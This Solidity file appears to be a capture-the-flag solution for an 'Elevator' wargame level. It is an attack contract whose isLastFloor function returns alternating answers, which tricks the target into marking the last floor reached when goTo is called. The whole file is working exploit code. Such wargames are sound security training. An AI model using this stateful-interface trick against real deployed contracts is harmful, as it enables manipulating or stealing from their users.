// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ElevatorAttack {
    uint public attackVector = 0;
    
    function isLastFloor(uint) external returns (bool) {
        attackVector = attackVector + 1;
        return attackVector % 2 == 0;
    }
    
    function attackElevator(address _elevatorAddress) public {
        bytes memory payload = abi.encodeWithSignature("goTo(uint256)", 1);
        (bool sent, ) = _elevatorAddress.call(payload);
        require(sent);
    }
}